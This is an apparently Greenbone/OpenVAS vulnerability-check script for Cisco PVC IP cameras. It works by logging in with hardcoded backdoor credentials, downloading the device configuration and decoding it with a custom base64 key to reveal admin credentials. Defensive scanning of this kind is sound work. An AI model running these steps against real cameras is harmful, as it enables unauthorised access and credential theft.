if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105106" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Cisco PVC IP Cam Information Disclosure" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-11-05 10:38:34 +0100 (Wed, 05 Nov 2014)" );
	script_category( ACT_ATTACK );
	script_family( "CISCO" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "lighttpd/banner" );
	script_xref( name: "URL", value: "https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf" );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker read the config of the device including
  usernames and passwords." );
	script_tag( name: "vuldetect", value: "Send a HTTP GET request and check the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove
  the product or replace the product by another one." );
	script_tag( name: "summary", value: "Cisco PVC IP Camis prone to an information disclosure vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: lighttpd" ) || !ContainsString( banner, "IP Camera" )){
	exit( 0 );
}
url = "/oamp/System.xml?action=login&user=L1_admin&password=L1_51";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( buf, "sessionID:" )){
	exit( 0 );
}
session = eregmatch( pattern: "sessionID: ([^\r\n]+)", string: buf );
if(isnull( session[1] )){
	exit( 0 );
}
sess = session[1];
url = "/oamp/System.xml?action=downloadConfigurationFile";
useragent = http_get_user_agent();
host = http_host_name( port: port );
req = "GET " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Connection: close\r\n" + "sessionID: " + sess + "\r\n" + "\r\n";
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!IsMatchRegexp( result, "^HTTP/1\\.[01] 200" )){
	exit( 0 );
}
data = split( buffer: result, sep: "\r\n\r\n", keep: FALSE );
if(isnull( data[1] )){
	exit( 0 );
}
data[1] = chomp( data[1] );
config = str_replace( string: data[1], find: "\r\n", replace: "" );
conf_decoded = base64_decode( str: config, key_str: "ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+" );
if(ContainsString( conf_decoded, "admin_name" ) || ContainsString( conf_decoded, "admin_password" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

